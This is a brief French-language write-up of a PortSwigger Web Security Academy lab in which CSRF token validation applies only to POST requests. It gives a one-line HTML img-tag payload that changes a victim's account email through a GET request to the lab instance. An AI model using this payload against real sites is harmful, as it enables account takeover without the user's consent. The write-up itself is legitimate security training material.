# Lab

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

## Payload

Dans ce lab, les requetes POST requièrent un token CSRF, les requetes GET non.

```html
<img src="https://0af600aa03dbc86586176b2c00ed0004.web-security-academy.net/my-account/change-email?email=pwned@sa.net">
```